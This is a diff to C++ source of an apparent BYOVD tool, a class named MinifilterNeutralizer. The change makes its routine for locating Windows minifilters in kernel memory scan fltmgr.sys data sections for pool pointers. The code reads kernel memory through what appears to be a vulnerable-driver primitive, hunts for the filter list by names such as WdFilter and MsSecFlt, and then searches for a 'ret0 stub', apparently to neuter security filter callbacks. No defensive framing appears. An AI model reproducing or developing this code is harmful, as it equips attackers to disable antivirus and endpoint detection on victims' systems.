@@ -3755,28 +3755,69 @@ bool MinifilterNeutralizer::VerifyFltPipeline() {
     checksPassed++;
     ByovdDiag("FLT:VERIFY: PASS — FltGlobals at 0x%llX\n", (unsigned long long)fltGlobals);
 
-    // === Check 3+4: FLTP_FRAME pool scan → find FilterList + enumerate filters ===
-    // ★ BUILD 480: Win11 FltGlobals 布局改变 — globQw[0] 是池 FLTP_FRAME 的直接指针
-    //   不再通过 FrameList.Flink 间接寻找, 直接在池结构中扫描所有 LIST_ENTRY,
-    //   遍历每个 LIST_ENTRY 并尝试找到包含有效 UNICODE_STRING 的 FLT_FILTER
-    ByovdDiag("FLT:VERIFY: [3/%d] Reading FltGlobals + scanning pool FLTP_FRAME...\n", checksTotal);
+    // === Check 3: FLTP_FRAME pool scan — find FilterList + enumerate filters ===
+    // ★ BUILD 482: .data scan 在 Win11 上不可靠 (选错候选).
+    //   改为: 扫描 fltmgr .data + .rdata 段中所有指向池内存的指针,
+    //   每个都当做候选 FLTP_FRAME, 直到找到包含有名 minifilter 的 FilterList
+    ByovdDiag("FLT:VERIFY: [3/%d] Scanning fltmgr .data for pool FLTP_FRAME candidates...\n", checksTotal);
 
-    uint64_t globQw[8] = {};
-    for (int i = 0; i < 8; i++) {
-        kma.ReadKernelVA(fltGlobals + i * 8, &globQw[i], 8);
+    // 读 PE header 获取 .data 段范围
+    IMAGE_DOS_HEADER dos = {};
+    IMAGE_NT_HEADERS64 nt = {};
+    uint64_t ntHdrVA = 0;
+    if (kma.ReadKernelVA(fltmgrBase, &dos, sizeof(dos)) && dos.e_magic == IMAGE_DOS_SIGNATURE) {
+        ntHdrVA = fltmgrBase + dos.e_lfanew;
+        kma.ReadKernelVA(ntHdrVA, &nt, sizeof(nt));
     }
-    ByovdDiag("FLT:VERIFY: FltGlobals hex: %016llX %016llX %016llX %016llX\n",
-        (unsigned long long)globQw[0], (unsigned long long)globQw[1],
-        (unsigned long long)globQw[2], (unsigned long long)globQw[3]);
-    ByovdDiag("FLT:VERIFY:            %016llX %016llX %016llX %016llX\n",
-        (unsigned long long)globQw[4], (unsigned long long)globQw[5],
-        (unsigned long long)globQw[6], (unsigned long long)globQw[7]);
 
-    // ★ 尝试每个 globQw[i] 作为可能的 FLTP_FRAME 池指针
-    //   对每个候选扫描 0x1000 字节, 寻找所有 LIST_ENTRY → 遍历 → 找有名 FLT_FILTER
+    uint64_t dataStart = fltmgrBase, dataEnd = fltmgrBase + 0x40000; // default
+    if (nt.Signature == IMAGE_NT_SIGNATURE) {
+        auto* sec = IMAGE_FIRST_SECTION(&nt);
+        for (int s = 0; s < nt.FileHeader.NumberOfSections; s++) {
+            // 扫描 .data 和 .rdata 段
+            char name[9] = {};
+            memcpy(name, sec[s].Name, 8);
+            if (strstr(name, ".data") || strstr(name, ".rdata") || strstr(name, "PAGE")) {
+                uint64_t sStart = fltmgrBase + sec[s].VirtualAddress;
+                uint64_t sEnd = sStart + sec[s].Misc.VirtualSize;
+                ByovdDiag("FLT:VERIFY: Section '%s': 0x%llX-0x%llX\n", name,
+                    (unsigned long long)sStart, (unsigned long long)sEnd);
+                if (sStart < dataStart || dataStart == fltmgrBase) dataStart = sStart;
+                if (sEnd > dataEnd) dataEnd = sEnd;
+            }
+        }
+    }
+    ByovdDiag("FLT:VERIFY: Scanning 0x%llX-0x%llX for pool pointers...\n",
+        (unsigned long long)dataStart, (unsigned long long)dataEnd);
+
+    // 扫描 .data/.rdata 段中所有指向池内存的 qword (步长 8)
+    // 池地址特征: 0xFFFF800000000000 ~ 0xFFFFE00000000000
+    // 最多收集 32 个唯一候选
+    uint64_t poolCandidates[32] = {};
+    int candCount = 0;
+
+    for (uint64_t addr = dataStart; addr < dataEnd && candCount < 32; addr += 8) {
+        uint64_t val = 0;
+        if (!kma.ReadKernelVA(addr, &val, 8)) continue;
+        // 必须是有效的池地址 (非 fltmgr 自身, 非 ntoskrnl)
+        if (val < 0xFFFF800000000000ULL) continue;
+        if (val > 0xFFFFE00000000000ULL) continue; // 排除模块地址空间
+        // 去重
+        bool dup = false;
+        for (int c = 0; c < candCount; c++) {
+            if (poolCandidates[c] == val) { dup = true; break; }
+        }
+        if (!dup) {
+            poolCandidates[candCount++] = val;
+        }
+    }
+
+    ByovdDiag("FLT:VERIFY: Found %d unique pool pointer candidates in fltmgr .data\n", candCount);
+
+    // ★ BUILD 482: 遍历所有池指针候选 (最多 16 个, 找到有名 minifilter 立即停止)
     uint64_t bestListHead = 0;
     int bestFilterCount = 0;
-    int bestQi = -1;
+    int bestCi = -1;
     uint64_t bestFilterListOff = 0;
 
     // 全范围 Name 偏移 (覆盖 FLT_FILTER 可能的所有 Name 位置)
@@ -3794,19 +3835,22 @@ bool MinifilterNeutralizer::VerifyFltPipeline() {
     };
     static const int allNameOffCount = sizeof(allNameOffs) / sizeof(allNameOffs[0]);
     static const uint64_t alOffs[] = { 0x008,0x010,0x018,0x020,0x028,0x030,0x038,0x040,0x048,0x050 };
+    static const wchar_t* knownFilters[] = {
+        L"FileInfo", L"WdFilter", L"luafv", L"wcifs",
+        L"bindflt", L"storqosflt", L"CldFlt", L"bfs",
+        L"RsFx", L"MsSecFlt", L"Wof", L"DfsrRo",
+    };
+    static const int kfCount = sizeof(knownFilters) / sizeof(knownFilters[0]);
 
-    for (int qi = 0; qi < 8; qi++) {
-        uint64_t poolFrame = globQw[qi];
-        if (poolFrame < 0xFFFF800000000000ULL) continue;
-        // 排除 fltmgr 模块自身 (.data 区域)
-        // 池地址通常在 0xFFFFBC00~0xFFFFDE00 范围
-        if (poolFrame > 0xFFFFE00000000000ULL) continue;
+    int maxTry = (candCount < 16) ? candCount : 16;
+    for (int ci = 0; ci < maxTry; ci++) {
+        uint64_t poolFrame = poolCandidates[ci];
 
-        ByovdDiag("FLT:VERIFY: Trying globQw[%d]=0x%llX as pool FLTP_FRAME...\n",
-            qi, (unsigned long long)poolFrame);
+        ByovdDiag("FLT:VERIFY: [%d/%d] Trying pool candidate 0x%llX as FLTP_FRAME...\n",
+            ci + 1, maxTry, (unsigned long long)poolFrame);
 
-        // Dump FLTP_FRAME 前 0x200 bytes 用于诊断
-        ByovdDiag("FLT:VERIFY:   FLTP_FRAME[%d] +0x000:", qi);
+        // Dump 前 8 qword
+        ByovdDiag("FLT:VERIFY:   +0x000:");
         for (int j = 0; j < 8; j++) {
             uint64_t qw = 0;
             kma.ReadKernelVA(poolFrame + j * 8, &qw, 8);
@@ -3814,17 +3858,8 @@ bool MinifilterNeutralizer::VerifyFltPipeline() {
         }
         ByovdDiag("\n");
 
-        // ★ BUILD 481: 直接在池内存中搜索已知 minifilter 名称 (WCHAR)
-        //   相对于结构遍历, 字符串扫描更可靠 — 不依赖结构偏移假设
-        //   扫描范围: poolFrame-0x5000 ~ poolFrame+0x5000
-        static const wchar_t* knownFilters[] = {
-            L"FileInfo", L"WdFilter", L"luafv", L"wcifs",
-            L"bindflt", L"storqosflt", L"CldFlt", L"bfs",
-            L"RsFx", L"MsSecFlt", L"Wof", L"DfsrRo",
-        };
-        static const int kfCount = sizeof(knownFilters) / sizeof(knownFilters[0]);
-
-        ByovdDiag("FLT:VERIFY:   Pool string scan around FLTP_FRAME[%d] (±0x5000)...\n", qi);
+        // 先在 ±0x5000 范围扫描已知 minifilter 名称
+        ByovdDiag("FLT:VERIFY:   Pool string scan ±0x5000...\n");
         int strHits = 0;
         for (int64_t sOff = -0x5000; sOff < (int64_t)0x5000 && strHits < 16; sOff += 16) {
             uint64_t sAddr = poolFrame + sOff;
@@ -3844,9 +3879,8 @@ bool MinifilterNeutralizer::VerifyFltPipeline() {
                         if (c1 != c2) { match = false; break; }
                     }
                     if (match) {
-                        ByovdDiag("FLT:VERIFY:   [!] FOUND '%ls' string at 0x%llX (FLTP_FRAME%+lld)\n",
-                            knownFilters[k], (unsigned long long)(sAddr + b),
-                            (long long)(sAddr + b - poolFrame));
+                        ByovdDiag("FLT:VERIFY:   [!] FOUND '%ls' at 0x%llX\n",
+                            knownFilters[k], (unsigned long long)(sAddr + b));
                         strHits++;
                         break;
                     }
@@ -3855,7 +3889,7 @@ bool MinifilterNeutralizer::VerifyFltPipeline() {
             }
         }
         if (strHits == 0)
-            ByovdDiag("FLT:VERIFY:   No known minifilter strings found in pool scan (±0x5000)\n");
+            ByovdDiag("FLT:VERIFY:   No known strings; scanning LIST_ENTRYs...\n");
 
         // 扫描 LIST_ENTRY 候选 (0x000 ~ 0xFF8, step 8)
         int localCandidates = 0;
@@ -3900,13 +3934,19 @@ bool MinifilterNeutralizer::VerifyFltPipeline() {
                 if (foundNamed > bestFilterCount) {
                     bestFilterCount = foundNamed;
                     bestListHead = head;
-                    bestQi = qi;
+                    bestCi = ci;
                     bestFilterListOff = off;
                 }
             }
         }
         if (localCandidates > 0)
-            ByovdDiag("FLT:VERIFY:   globQw[%d]: %d LIST_ENTRYs with named filters\n", qi, localCandidates);
+            ByovdDiag("FLT:VERIFY:   candidate[%d]: %d LIST_ENTRYs with named filters\n", ci, localCandidates);
+
+        // ★ 找到至少 1 个有名 filter 即可停止
+        if (bestFilterCount > 0) {
+            ByovdDiag("FLT:VERIFY:   → found %d named filters, stopping scan\n", bestFilterCount);
+            break;
+        }
     }
 
     if (bestFilterCount == 0) {
@@ -3916,7 +3956,7 @@ bool MinifilterNeutralizer::VerifyFltPipeline() {
     }
     checksPassed++;
     ByovdDiag("FLT:VERIFY: PASS — FilterList at globQw[%d]+0x%llX (%d named filters)\n",
-        bestQi, bestFilterListOff, bestFilterCount);
+        bestCi, bestFilterListOff, bestFilterCount);
 
     // === Check 4: ret0 stub found ===
     ByovdDiag("FLT:VERIFY: [4/%d] Finding ret0 stub in fltmgr.sys...\n", checksTotal);
